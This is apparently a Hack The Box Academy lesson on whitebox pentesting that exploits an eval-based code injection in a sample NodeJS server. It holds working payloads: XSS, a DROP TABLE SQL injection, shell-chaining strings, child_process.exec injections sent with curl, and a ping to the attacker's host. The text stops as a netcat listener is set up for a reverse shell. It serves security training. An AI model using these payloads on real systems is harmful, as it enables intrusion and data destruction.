# Introduction

* * *

Welcome to the `Whitebox Pentesting 101: Command Injection` module!

When we begin a `Whitebox Pentesting` exercise, we start by reviewing the codebase and analyzing it for vulnerabilities, as learned in the [Secure Coding 101](https://academy.hackthebox.com/module/details/38) module. Once we identify a potential vulnerability, we start our attempts to exploit it, through planning, local debugging, and eventually exploitation, which is what we will cover in this module.

In this module, we will discuss four main topics, as follows:

1. Code Review 'highlights'

2. Command Injection

3. Local Debugging

4. Exploitation


For example, we can imagine that our client has invited us to their site and asked us to analyze the application's code and check for vulnerabilities. One of the most common vulnerabilities in newly written code is the `Command Injection` vulnerability. These vulnerabilities are mostly caused by the inattention and time pressure that the developers have to endure during the development process.

This often results in solving complex processes as simple as possible, which leads to functions not being written correctly, allowing certain types of privilege escalation or breakouts. Some functions are then written in such a way that they execute internal system commands. Our goal is to identify these vulnerabilities during the Whitebox penetration test.


# Obtaining the code: A NodeJS Server

* * *

At the end of the [Secure Coding 101](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) module, you should have been able to extract a link and an archive password, through reversing or exploiting the JavaScript code of that module:

Archive Link: /093863aaef36aa270f95e8e5c3cc9fa5/nodejs-server-sourcecode.zip

Archive Password: unSqyU7wQc7uFRBV

The link and the archive password can be used in this module. Simply power up your PwnBox, and attempt to access the path on the Docker instance in the below question.

* * *

## Refresher Exercise

With the skills you learned in the [Secure Coding 101](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript), you should be able to properly review the JavaScript code and identify potential vulnerabilities in it. Unzip the archive, take a look the code, and attempt to apply your Secure Coding and Reverse Engineering skills to identify the vulnerability within the code.


# Code Analysis: Server.js

* * *

As the majority of the main concepts about Secure Coding have been covered in the [Secure Coding 101](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript) module, we will not be going into a detailed code review in this section, but rather quick code review highlights only. Once we download the archive and unzip it, we should have the following files within it:

```shell
unzip -qq nodejs_server_sourcecode.zip && ls

admin.html     denied.html    server.js      validateKey.js

```

We see two `.html` files, which after we take a quick look at seem to be simple pages showing us the page we have reached.

This leaves us with the JavaScript files: `server.js` and `validateKey.js`

* * *

## Server.js

We take a look at the `server.js` script, and we see the following:

```javascript
...SNIP...
const { validateKey } = require("./validateKey");

function deniedPage(res) {
    fs.readFile(__dirname + "/denied.html")
        ...SNIP...
}

function adminPage(res) {
    fs.readFile(__dirname + "/admin.html")
       ...SNIP...
}

var server = http.createServer(function (req, res) {
    if (req.url == '/') {
    ...SNIP...
    else if (req.url == '/admin') {
        if (req.method == 'POST') {
            ...SNIP...
            req.on('end', function () {
                if (validateKey(body)) {
                    adminPage(res);}
                else {
                    deniedPage(res);}
       ...SNIP...
        else {
            deniedPage(res);}
       ...SNIP...
});

server.listen(port, host, () => {
    console.log(`Server is running on http://${host}:${port}`);
});

```

* * *

## Code Functionality

From the above code, we can deduce the following:

1. It has two defined functions: `deniedPage` and `adminPage`, which appear to be reading their respective `.html` files and setting it as the returned server page.

2. At the end of the script, we see an `http` server listening on the `port` and `ip` specified at the beginning, with `server.listen(port, host)`

3. The `server` variable is defined above it as `http.createServer`, and routes to 2 possible URLs:
1. `/` which is the root link, simply returning `http` code `200` without actually writing anything on the page
2. `/admin`, if the `http` request method is `POST`, then it would pass the `POST` data to the `validateKey` key function
3. If the `validateKey` function returns `true` then the server would show the _admin_ page returned by the `adminPage` function _step 1_, otherwise it would show the _denied_ page from `deniedPage`

This was a quick rundown of the NodeJS server's main functionality. We now understand that the script starts a server, and if we send a `POST` request, its data would be passed to a `validateKey` function, which would then either show us the `admin` or `denied` pages. We did not notice any vulnerabilities so far. However, the `validateKey` is not defined within the `server.js` file, but is imported from its own file, as follow:

```JavaScript
const { validateKey } = require("./validateKey");

```


# Vulnerability Identification: ValidateKey.js

* * *

Once we open the `validateKey.js`, we quickly realize that it has been obfuscated, but that shouldn't stop us! We apply the skills we learned in the previous module, and end up with the following function at the end of the file:

```JavaScript
function validateKey(input) {
    try {
        json = JSON[parse](input);
        var keyHash;
        eval('const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("' + json[key] + '").digest("hex");');
        if (keyHash == "b7fb...SNIP...d2") {
            return true;
        }
    } catch (previousState) {
        return console[log](previousState), false;
    }
    return false;
}

```

Note: "!!\[\]" simply evaluates to "true", while "!\[\]" evaluates to "false".

So, once again, let's quickly run down this function:

1. First, it parses the input as JSON, so our `POST` data must be in JSON.

2. Then, It uses `eval` to run the following JavaScript code:


```JavaScript
const crypto = require("crypto");
keyHash = crypto.createHash("md5").update( + json[key] + ).digest("hex");

```

1. The above code seems to calculate the `md5` hash of `json[key]`, which is the value of the `key` key in the JSON input, and stores the hash value in the `keyHash` variable.

2. If `keyHash` is equal to some `md5` hash, then it would return `true`, otherwise, it returns `false`.


So, basically, the `validateKey` function checks for the `key` JSON key and calculates its `md5` hash, if it is the expected hash, it would grant us access by returning `true`. However, the most important part yet, is the `eval` function, which, as we learned in the [Secure Coding 101](https://academy.hackthebox.com/module/details/38) module, can lead to a code injection vulnerability, if user input was inputted into it. As we can see, it does have a variable `json[key]` within it:

```javascript
eval('const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("' + json[key] + '").digest("hex");');

```

If `json[key]` can be controlled by us, then we may have a Command Injection vulnerability. We will verify that with local debugging, and then will attempt to exploit it. Before we are able to attempt to exploit it, we need to first understand Command Injection vulnerabilities. So, in the next section, we'll go deeply into Command Injection vulnerabilities.


# Injections

* * *

We've been talking about Command Injection for a while now. But what is it? How does it work? This is what we'll cover in this section.

* * *

## What is an Injection?

An injection occurs when an application misinterprets user input as actual code, rather than a string, hence changing the code flow and executing this code. Unless the user input is sanitized, the application is very likely to execute the injected code and run it. Sanitization means removing any special characters, in order to break any injection attempts. We will discuss how to bypass sanitization and filters in future modules. For now, let's focus on basic injection. Let's take a look at some examples of Injections.

* * *

## HTML Injection

An HTML Injection occurs when user input is displayed on the page without sanitizing it from `HTML` elements. For example, if a page 'like a chat room' does not sanitize user input, and directly shows it as it was sent, a user could wrap his text with `<h1>` to make it stand out. In this case, it would show as:

#### Injected HTML

If it was sanitized, it should show a normal text:

```HTML
Injected HTML

```

* * *

## XSS

Another example of injections is Cross-Site Scripting, which is very similar to HTML injection, only the injection would be a JavaScript code wrapped in `<script>`. For example, in the same previous scenario, a malicious actor could inject the following code:

```HTML
<script>alert('This is a XSS injection!')</script>

```

Which would pop out an alert saying " `This is a XSS injection!`". However, this does not stop here. As a malicious actor have full access to JavaScript, they may be able to do all sorts of malicious actions, from resetting the viewer's password, to controlling their entire machine.

* * *

## SQL Injection

Finally, one of the most common injection examples is an SQL injection. An SQL injection occurs when user input is inputted into the SQL query string, without properly sanitizing or filtering the input. The following example in PHP showcases one case:

```php
userId = $_GET['userId'];
sqlCmd = "SELECT * FROM Users WHERE UserId = " . userId;

```

In normal cases, the user id would be inputted to complete the query, and it would return the expected outcome. However, there's nothing stopping the user from expanding the SQL query, and obtaining other results. If the `userId` is set to `1; DROP TABLE Users;`, the final query would be as follows:

```php
SELECT * FROM Users WHERE UserId = 1; DROP TABLE Users;

```

Once the query is run, the `Users` table would get deleted! The same concept applies to Command Injections. Injections can occur when user inputted directly goes into the vulnerable function, like the above example, or even when user input indirectly goes into the vulnerable function. We will discuss indirect command injection in coming modules.


# Command Injection

* * *

Now that we understand how injections work, let's try to understand how Command Injections work.

* * *

## What is a Command Injection Vulnerability?

A Command Injection vulnerability occurs when user input goes into a function that executes code or system commands. This falls into two type of functions:

1. `Code Injection`:
   - The most common examples of this function are `eval` and `exec`, available in JavaScript, Python, PHP, and others.
   - In this case, you would be injecting language code, rather than system commands.
   - You may be utilize this to execute other functions, like the ones we will see next, to execute system commands.
2. `Command Injection` (Directly execution of system commands on the hosting server):
   - In this case, you would be injecting system commands directly (i.e., bash/cmd commands).

The first thing we have to do is decide whether we are dealing with `Code Injection` or `Command Injection`. As we will see later, this makes a difference in our payload injection.

* * *

## System Command Execution Functions

In order to identify a command/code injection vulnerability during a Whitebox Pentesting exercise, we start by looking functions that execute system commands or evaluates language code. The following are some of the functions that would so:

| **JavaScript 'NodeJS'** | **Python** | **PHP** | **C/C++** | **C#** | **Java** |
| --- | --- | --- | --- | --- | --- |
| child\_process.exec | os.system | exec | system | System.Diagnostics.Process.Start | Runtime.getRuntime().exec |
| child\_process.spawn | os.popen | system | popen |  |  |
| eval | subprocess.run | shell\_exec | execlp |  |  |
|  | subprocess.open | passthru | execvp |  |  |
|  | eval | proc\_open | ShellExecute |  |  |
|  | exec | popen |  |  |  |
|  |  | eval |  |  |  |


# Payload

* * *

In this section, we will discuss how to inject our command into a vulnerable function. We start by subverting the application logic through injecting our input as part of the code, rather than a simple input string. We do this by closing any opened quotes or parenthesis, and then adding our injection after that. Our first step is to prepare our payload. Our payload can depend on the type of injection, `Command Injection` or `Code Injection`.

* * *

## Command Injection

When injecting in `Command Execution functions`, we can use the following `bash`/ `cmd` operators to append our command to the original command: `;`, `&`, `&&`, `|`, `||`, `0x0a`, `\n`, and many others.

We should properly append/chain our system command to the original command, so both the intended system command and our command would be executed.

```javascript
child_process.exec("echo '" + input + "'")

```

In this case, our input will be wrapped by quotes `'`, and so it always be taken as a string. In order to inject, we have to close the quotes `'` to escape their bounds, so that when the command is executed, it would execute our code instead of `echo` ing it:

- `'; whoami; '`

Such that the final command would be:

```javascript
child_process.exec("echo ''; whoami; ''")

```

Which should execute the following command:

```bash
echo ''; whoami; ''

```

* * *

## Code Injection

When injecting in `Code Execution Functions`, we can use code operators to append our code, such as " `;`", " `+`", and " `.`".

```javascript
eval("var i = '" + input + "'")

```

We can inject by closing the single quote and wrapping our payload with " `;`" or " `+`":

```javascript
'; console.log('injection'); '

```

Such that the final line will be:

```javascript
eval("var i = ''; console.log('injection'); ''")

```

Which will execute the following JavaScript code:

```javascript
var i = ''; console.log('injection'); ''

```

In many cases, our injection may introduce syntax errors if we are not careful.


# Syntax Errors

* * *

Once we have our payload, we must ensure that the code can still execute without errors, and that our injection does not introduce any syntax errors, or break the system command/line of code. There are three main things we can follow to ensure we avoid introducing syntax errors:

1. Comment Out the Rest

2. Even Quotes/Parentheses

3. Escaping/Encoding Special Characters


* * *

## Comment Out the Rest

In many cases we can also `comment out` the remaining part of the function, so that no errors would be introduced from the latter part of the line. Take the following example:

```javascript
child_process.exec("echo 'user: " + input + "'")

```

We can inject:

```bash
'; whoami; #

```

We can comment out the rest with " `#`":

```javascript
child_process.exec("echo 'user: '; whoami; #'")

```

Which should execute the following command:

```bash
echo 'user: '; whoami; #'

```

Notice that any part after the " `#`" would be considered as a comment, and ignored, so we do not have to worry about what comes after " `#`".

* * *

## Even Quotes/Parentheses

We should ensure that after our injection, all parentheses and quotes are even, and none of them is left unclosed. In order to inject, we would have to evenly close/open any single quotes, double quotes, or parenthesis:

```javascript
child_process.exec("echo 'user: " + "';whoami; '" + "'")

```

We can manually calculate the number of quotes and parenthesis to ensure it is even, or check where each one is opened and ensure it gets closed.

* * *

## Escaping/Encoding Special Characters

Just like we ensure we would not break the system command, we must ensure not to break the function code. In case we use any special character within our code, we should ensure to escape them so they don't get execute as part of the function.

Example:

```javascript
child_process.exec("echo 'user: " + "'; echo \"test\"; '" + "'")

```

Which should execute the following command:

```bash
echo 'user: "'; echo "test"; ''

```

In the above example, we were able to use `"` without affecting the code logic, which also uses `"` around the function parameters. If we had not escaped it, it would actually close the `exec` function parameters, and what comes after it would be taken as other parameters, hence breaking the function. In some other cases, we may want to encode some characters that may not be automatically encoded by browser or terminal tools, like the `#` character, which encodes to `%23`.

* * *

## Exercise

Before we continue, let's practice what we just learned. The server below has a a very basic Command Injection vulnerability.

```javascript
...
    else if (url.parse(req.url).pathname == '/ping') {
        res.writeHead(200);
        try {
            var ip = url.parse(req.url, true).query['ip'];
            child_process.exec(
                'ping -c 1 "' + ip + '"',
                function (error, stdout) {
				  	...
                    res.write(stdout);
                    res.end();
                });
		...
    }
...

```

When visiting `/ping`, it pings the IP specified in the `?ip=` parameter, using `child_process.exec`. Using the techniques you learned in this section, try to access the URL shown in the question, and inject a command to retrieve the flag.


# Planning

* * *

Now that we properly understand how Command Injection works, let's try to apply what we learned on our NodeJS server, and attempt to exploit it. As we saw in our code review, the `validateKey.js` script had an `eval` function that uses a potentially user-controlled parameter `json[key]` as an input:

```javascript
eval('const crypto = require("crypto"); keyHash = crypto.createHash("md5").update("' + json[key] + '").digest("hex");');

```

Let's find our way into `json[key]`, and see if we can actually exploit the function and inject our commands.

* * *

## The Plan

Going back to our code review, we need to plan our way into `json[key]`, and see what it would take for us to control it. For that, let's start with it, and work our way backwards, to see what is required to control it.

Tip: To better understand what each point means, you can follow along the below highlights in the JavaScript scripts.

* * *

## Controlling Input:

1. In `validateKey.js`, the `json[key]` object is the JSON key ' `key`', within the JSON object `json = JSON[parse](input);`

2. `json` is the `input` variable parsed as JSON

3. `input` is passed to the `validateKey` function as a parameter.

4. In `server.js`, `body` is being passed to `validateKey` as the `input` parameter in `if (validateKey(body)) {`

5. `body` is defined as `req.on('data', function (data) {body += data;})`

6. `data` makes the `body` variable, which is part of `req`

7. `req` is the request handler within `http.createServer`, and `data` is the request data

8. `http.createServer` is defined as the `server` variable


So, `json[key]` get its input from the server request body. Next, we need to know how to reach a state where this input would be used. Let's work our way backwards again, and see any which calls and if statements we need to pass to reach it.

* * *

## Passing Conditions:

1. In order to control `json[key]` we need to land in the `validateKey` function

2. `validateKey` gets called in `server.js` if `req.method == 'POST'`

3. This condition occurs if `req.url == '/admin'`

4. `server` always gets called by default at the end of the script


This means that if we send a `POST` request to `/admin`, the body of our request would go directly into `json[key]`. We did not notice any sanitization, so we will not have to work around that. Now we can write down our plan to take control over the `json[key]`, which should allow us to test various Command Injections payloads later. To get our plan, we can simply reverse the above steps, to know what steps we should follow to control `json[key]`.

* * *

## The Plan:

1. We have to visit the `/admin` page

2. We have to send a POST request to it

3. Our POST request must contain JSON data

4. Our JSON data must have a `key` key and its value ' `{'key':'value'}`'

5. The value of `key` should go into the `eval` function, which we can use to exploit it


Now that we have our plan, next we will download the code archive to our Pwnbox for some local debugging and testing. We will go through each step in our plan, and debug each of them, to ensure that we successfully pass it, until we are able to control `json[key]`.


# POST Requests

* * *

Before we start our local debugging and following our plan, we must first understand why it is necessary. During any Whitebox Pentesting exercise, it is very important to properly study the code and perfectly understand how our input flows into it.
For basic vulnerabilities, we may be able to quickly identify the vulnerability without having to plan for it, however, as we progress through `Whitebox Pentesting` modules, the code functionality would become more and more complicated, and without proper planning and local debugging, we may never be able to exploit the vulnerability, or even identify it. With that cleared, we shall start following our plan. Our plan was as follows:

1. We have to visit the `/admin` page

2. We have to send a POST request to it

3. Our POST request must contain JSON data

4. Our JSON data must have a `key` key and its value ' `{'key':'value'}`'

5. The value of `key` should go into the `eval` function, which we can use to exploit it


So, through local debugging, we will be making sure that we hit each of the above steps.

* * *

## Admin Page

Our first step is very simple, and it is to ensure that our understanding of the NodeJS routing system is correct. First, we will extract the content of the archive in our Pwnbox:

```shell
unzip -qq nodejs_server_sourcecode.zip && ls

admin.html     denied.html    server.js      validateKey.js

```

Now, in order to verify that we reached the `/admin` page, we will add the following line after line 41 in `server.js`, which is where the script verifies the requested url:

```javascript
41  else if (req.url == '/admin') {
42    console.log('Reached /admin');

```

Now, we can run our server with the following command:

```shell
node server.js

Server is running on http://0.0.0.0:21440

```

Lastly, we can simply visit the `/admin` page on our local host using our browser, on the following link [http://127.0.0.1:21440/admin](http://127.0.0.1:21440/admin). Once we visit the page, we go back to our terminal, and verify that we hit `/admin`:

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin

```

Now, let's move to step 2 in our plan.

* * *

## POST Request

Our next step is to send an empty POST request, and ensure that we land in this part of code. To do that, we'll first stop our server, and add the following line after line 43 in `server.js`, which is where the script checks if the request method is a POST request:

```javascript
        if (req.method == 'POST') {
            console.log('Received a POST request');

```

Now, we will once again run our server, and - _in a new terminal window_\- send a POST request using `curl`, with the following command:

```shell
curl http://127.0.0.1:21440/admin -X POST

```

We check out our `node` server, and see that we indeed hit our target:

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin
Received a POST request
SyntaxError: ...

```

However, as seen above, we do hit an error when sending an empty POST request.


# Local Debugging: JSON keys

* * *

In our previous attempt, we got a syntax error after sending our request. In this section, we'll verify that we reached `validateKey`, and will send a proper JSON request, until we are able to control what goes into the `eval` function.

* * *

## ValidateKey

Our next step is to verify that we reached the `validateKey` function. However, this function is minified and obfuscated, so it's not easy to add lines to it or debug it. So, in order to be able to do so, we have to beautify it first.

Note: Many JavaScript beautifying tools would break the code, so it would be pretty, but it would not actually work!

So, in order to avoid this issue, we would have to pick a proper tool to do the job. We will use [https://prettier.io/playground/](https://prettier.io/playground/), which can be used online or as a `VSCode` extension. We copy the content of `validateKey.js`, beautify it in the above website, and copy it back to `validateKey.js`. Another option would be to simply open `validateKey.js` in `VSCode`, and use the prettier extension to do the same thing.

![](WpBmIERxHs6N.jpg)

Now, we can add a `console.log` within the `validateKey` function, after line 80:

```javascript
80  function validateKey(input) {
81    console.log('Reached validateKey');

```

Once again, we restart our server, resend our previous `curl` command, and check out the output in our terminal again:

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin
Received a POST request
Reached validateKey
SyntaxError: ...

```

We see `Reached validateKey` printed, proving that we did land into the `validateKey` function. We still see the JSON error, so let's try to fix that by sending an actual JSON request.

* * *

## JSON

First, let's simply try sending an empty JSON field in our POST request, by adding " `-d '{}'`" to our `curl` command, and check if the error goes away:

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{}'

```

We send the request, and we see that we no longer get an error in our NodeJS log:

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin
Received a POST request
Reached validateKey

```

Great! Now, we need to craft a proper JSON request, which would land us right into the `eval` function. In order to do that, we must create a JSON request with a key named `key`, as per our earlier plan. The following JSON should do the trick:

```javascript
{"key":"this is just a test!"}

```

Before we send it, let's log the `json` variable within the `validateKey` function, by adding the following line after the `json` variable is created:

```javascript
      json = JSON[_0x1415("0xb")](input);
      console.log('JSON: %j', json);

```

Now, we can restart our server, and send our JSON using `curl`:

```bash
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"this is just a test!"}'

```

We see our JSON request printed as we sent it, proving that we have complete control over it.

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin
Received a POST request
Reached validateKey
JSON: {"key":"this is just a test!"}

```

We have now verified that we can control the `json[key]`, which is our main object of interest. As the last step in our plan before moving to exploitation, in the next section, we will verify that we can indeed control the `eval` function.


# Controlling The Eval Function

* * *

Our final step is to verify that whatever we send as the value of `key` goes directly into the `eval` function unchanged. In many cases, sanitization or filtering may greatly change our input, so that we would have to work around that. Fortunately, as seen earlier, we did not notice any sanitization or filtering being done.

* * *

## The Eval Function

Let's confirm that our input goes unchanged into `eval`. To do that, we will copy the `eval` function, change it into `console.log`, and insert it right after the original `eval` function (after line 97), so that we can examine exactly what goes into the `eval` function:

```javascript
      eval(
        _0x1415("0xc") +
          _0x1415("0x6") +
          _0x1415("0xe") +
          _0x1415("0x4") +
          _0x1415("0x9") +
          _0x1415("0xf") +
          _0x1415("0x5") +
          _0x1415("0x1") +
          json[_0x1415("0x7")] +
          (_0x1415("0x2") + _0x1415("0x8"))
      );
      console.log(
        _0x1415("0xc") +
          _0x1415("0x6") +
          _0x1415("0xe") +
          _0x1415("0x4") +
          _0x1415("0x9") +
          _0x1415("0xf") +
          _0x1415("0x5") +
          _0x1415("0x1") +
          json[_0x1415("0x7")] +
          (_0x1415("0x2") + _0x1415("0x8"))
      );

```

Then, we can restart our server and execute our `curl` command again, and examine the NodeJS log:

```shell
node server.js

Server is running on http://0.0.0.0:21440
Reached /admin
Received a POST request
Reached validateKey
JSON: {"key":"this is just a test!"}
const ...SNIP... ("hex");

```

We see that our input ' `this is just a test!`' is unchanged within the eval function. We have now proved that we have a complete control over an input that goes unchanged directly into the `eval` function. All that is left is to start exploiting this vulnerability.


# Preparing Payload

* * *

We finally reach the part where we can start exploiting the script. We have so far confirmed that we have a direct input into an `eval` function, which gives us the ability to inject code directly into the NodeJS server. We will utilize the techniques we learned in the `Payload` and `Syntax Errors` section, in order to successfully inject a command.

* * *

## Code Injection

We should keep in mind that in this case we are injecting into an `eval` function, rather than a function that executes system commands. So, whatever we inject in this case has to be in JavaScript. Now, let's attempt applying these steps one by one, and test our injection. The line of code we will be injecting into is the following:

```javascript
eval('const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(" + json[key] + ").digest("hex");')

```

Our injection should be at the `json[key]` variable.

Note 1: You can use the \`console.log(content-of-eval)\` trick we used in local debugging to get this line, instead of manually deobfuscating it.

Note 2: Don't forget to delete any \`console.log\` lines we added during our local debugging, to avoid any confusion.

Our steps to Code Injection are:

1. Preparing the Payload

2. Comment Out the Rest

3. Even Quotes/Parentheses

4. Escaping/Encoding Special Characters

5. Examining Payload


* * *

## 1\. Payload

The first thing we will try is a simple `console.log`, to verify that we properly injected our command. We have to close the first and last double quotes ' `"`', and append our new command by wrapping it with " `;`". Let's inject the following payload:

```javascript
"; console.log("successful injection"); "

```

We will use this payload as the value of `key` in our JSON object:

```javascript
{"key":PAYLOAD}

```

* * *

## 2\. Comment Out the Rest

In order to ensure that the code does not break after our injection, we can simply comment our the rest of the line of code. To do that, we will modify our payload by adding " `//`" at the end of it:

```javascript
"; console.log("successful injection"); //

```

Now, if we replace " `+ json[key] +`" in the above `eval` function with our payload, we see that the final input going into `eval` should be as follows:

```javascript
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""; console.log("successful injection"); //").digest("hex");

```

As we can see from the above syntax highlighting, the end of the function was commented out, and will not longer be executed as part of the code.

* * *

## 3\. Even Quotes/Parentheses

Next, we must ensure that all quotes and parenthesis are even. We can see from the payload above that the " `crypto.createHash("md5").update(`" function is not closed, because we commented out the rest of it. So, instead of starting with ' `";`', we will use ' `");`', to close the `.update` parenthesis as well:

```javascript
"); console.log("successful injection"); //

```

So the final input to `eval` would be:

```javascript
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""); console.log("successful injection"); //").digest("hex");

```

We can now see the the `.update` function is properly closed before our injection, and the code should execute correctly. We should also ensure all single quotes, double quotes, and parenthesis are even. We can use syntax highlighting to spot any errors with the code. In this case, everything is even. In the next section, we will continue with steps 4 and 5, and ensure that our payload is successfully injected, and goes into `eval` exactly as we send it.


# Code Injection

* * *

So far, we have prepared our payload, but have not sent it yet. Before sending it, however, we must escape all special characters. Finally, using local debugging, we will ensure that our payload goes into the `eval` function exactly as we sent it.

* * *

## 4\. Escaping/Encoding Special Characters

As discussed in the `Syntax Errors` section, when sending our command, we have to escape each special character, including escaping ' `\`' and ' `"`'. Manually escaping each special character can become confusing with large payloads. So, we will use " `jq -aR .`" to escape our payloads, as follows:

```shell
jq -aR .

"); console.log("successful injection"); //
"\"); console.log(\"successful injection\"); //"

```

Now, we can copy the escaped payload and use as the value in our JSON object `{"key":value}`.

Tip: When dealing with cURL, it may be better to url encode key characters within the value of the JSON object, like single quotes, which can be encoded as %27.

Finally, we can send it using `curl`, as we did in the `Local Debugging` sections:

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); console.log(\"successful injection\"); //"}'

```

We send our command, and get the following in our `server.js` terminal window:

```shell
node server.js

Server is running on http://0.0.0.0:21440
successful injection

```

We have successfully injected our code into the server, and executed `console.log`.

* * *

## 5\. Examining Payload

Before we move on to `Command Execution`, we have to examine how our input went into the `eval` function. This is a critical part in Whitebox Pentesting, in order to know exactly how our command is sent and received. Otherwise, we may face issues where we won't know where it is being caused.

To do that, let's edit `validateKey.js` to print the content of `eval` using `console.log(content-of-eval)`, similarly to how we did it in the `Local Debugging` section `Controlling eval`. Once we edit the script, we can run it once again, and send our `curl` command again, and examine the output:

```shell
node server.js

Server is running on http://0.0.0.0:21440
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""); console.log("successful injection"); //").digest("hex");
successful injection

```

We compare the payload to what we expected to get earlier:

```javascript
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""); console.log("successful injection"); //").digest("hex");

```

We see that the payload is exactly as we anticipated in the previous section.

This means that we did not introduce any errors, and that everything worked as expected. Now that we have verified that our payload is received as intended, we can move to `Command Exaction`, in order to execute commands on the host system.


# Command Execution

* * *

Now that we are able to successfully reach `Code Injection`, our next step is to move to system command execution. As mentioned in the `Command Injection` section, in NodeJS, we can use the following functions to execute system commands:

- `child_process.exec`

- `child_process.spawn`


In order to use these functions, we first have to import the `child_process` module, and then use the `exec` function, as follows:

```JavaScript
const { exec } = require("child_process");
exec("touch pwned");

```

So, following our previous steps, our payload would be the following:

```javascript
"); const { exec } = require("child_process"); exec("touch pwned"); //

```

We will once again escape our payload with `jq`:

```shell
jq -aR .

"); const { exec } = require("child_process"); exec("touch pwned"); //
"\"); const { exec } = require(\"child_process\"); exec(\"touch pwned\"); //"

```

Now, we can once again copy our escaped payload and send it using `curl`:

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"touch pwned\"); //"}'

```

We send our command, and check our `server.js` terminal:

```shell
node server.js

Server is running on http://0.0.0.0:21440
const crypto = require("crypto"); keyHash = crypto.createHash("md5").update(""); const { exec } = require("child_process"); exec("touch pwned"); //").digest("hex");

```

We can now stop our server, and check whether the `pwned` file was added:

```shell
ls

admin.html  denied.html  pwned  server.js  validateKey.js

```

We have successfully executed a system command using our `eval` injection. As you have noticed, we did not get any output back in our HTTP response with `curl` or in the `node server.js` console.


# Blind Verification

* * *

In the previous section, we were able to successfully execute a command on the system, through injecting JavaScript code into `eval`. However, the main thing we noticed is that we did not get any command output returned to us in the HTTP response to our `curl` command.

Since we are dealing with `Code Injection`, rather than `Command Injection`, it should be possible for us to inject another function that would return the output for us, and thus be able to execute commands and retrieve outputs. For now, we will be dealing with the much more difficult issue of `Blind Command Execution`, in which we may have achieved command execution, but with no output it would be difficult to verify that we did execute our command, or it was simply stopped by the WAF or Firewall.

* * *

## Blind Verification Methods

As we are doing local debugging, we can verify whether our command got executed, as we did in the previous section, by checking whether the file was created. However, when we execute the same command on a remote server, we would not be able to do the same thing, and without any output, we cannot know whether our command got executed. Still, there are many ways to verify whether we have command execution on a server, even when no output is being returned to us:

* * *

#### Using Sleep

We can delay the HTTP response by injecting a `sleep` command, and hence verify that we did execute a command. However, There are many cases in which this would not be a good way to verify command injection.

For example, if the NodeJS server is multi-threaded (which by default it is), the `sleep` command would be executed in the background, and we will get a response instantly, hence not knowing whether the `sleep` command was executed.

* * *

#### Redirecting Command Output

We can redirect the output of the command we executed with " `>`" to `/var/www/html/output.txt`, and then attempt visiting this page on the server. Though this may be a good way to eventually retrieve output, it may not be very good to `verify` command execution, as there are many ways this could fail without us knowing.

First, we would have to know the server directory (i.e. `/var/www/html`), and without knowing it, we may be directing our command output to a wrong destination. We also must have write permissions on that directory, otherwise our command may be failing due to lack of privileges. Also, this would not work on servers that only serve certain pages, and not an entire directory, like the `NodeJS` server in this case. If we write other files, we would not be able to access them.

* * *

#### Calling Our Server

This is a better way to do verification, as we can simply set up a server and wait for the call, and if we do get it, we would be able to verify that we got command execution. However, there are many things that can prevent this from executing.

For example, `wget` or `curl` may not being installed on the server. Also, firewall rules may prevent the server from reaching us.

In such cases, we would not know whether our command failed, or we did not successfully inject. This is good as a quick test, but if it fails we should not assume that we did not get command execution, and should verify using another method.

* * *

#### Pinging Our Server

This is one of the most reliable ways to verify blind command execution, since `ping` is almost always installed on both Linux and Windows servers. Furthermore, firewall rules usually allow ping (i.e. ICMP calls), so it is one of the most reliable ways to verify blind command execution.

This can still fail sometimes, due to very strict firewall rules or some other reasons, `but it is still one of the most reliable methods to attempt first`. So, let's try the `ping` method. Before we send our command, we must have our server listening for pings. We can do that on our Pwnbox with the following command:

```shell
sudo tcpdump -i lo icmp

```

Next, we will inject the following `ping` command:

```shell
ping -c 3 127.0.0.1

```

Note: The argument "-c 3" means that the server will ping us 3 times.

Now, we can send a `ping` command to our server, with:

```shell
curl http://127.0.0.1:21440/admin -X POST -d '{"key":"\"); const { exec } = require(\"child_process\"); exec(\"ping -c 3 127.0.0.1\"); //"}'

```

Note: In our "tcpdump" command, we used "-i lo" to only listen on our local network. When attacking the real server, we will change this to "-i eth0".

Note: In our injected command, we pinged "127.0.0.1", when attacking the real server, we will change this to our Pwnbox IP.

After we send our command, we check our `tcpdump` window for any hits:

```shell
sudo tcpdump -i lo icmp

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo request, id 3268, seq 1, length 64
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo reply, id 3268, seq 1, length 64
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo request, id 3268, seq 2, length 64
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo reply, id 3268, seq 2, length 64
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo request, id 3268, seq 3, length 64
xx:xx:xx.xxxxxx IP localhost > localhost: ICMP echo reply, id 3268, seq 3, length 64

```

As we can see, we received exactly 3 pings from our localhost (our local NodeJS server), thus verifying that we do indeed have command execution, without actually getting any output. Now that we can verify that we can execute commands, in the next section, we will try to get a shell on our own server, and then will discover potential ways of getting a shell on the remote server.


# Exploitation: Remote Code Execution

* * *

In this section, we will try to execute a command that would send a reverse shell to our server.

* * *

## Local Shell

First, we will listen on any port of our choosing, in this case we chose `1234`, by standing up a `netcat` or `nc` listener:

```shell
nc -lvnp 1234

```

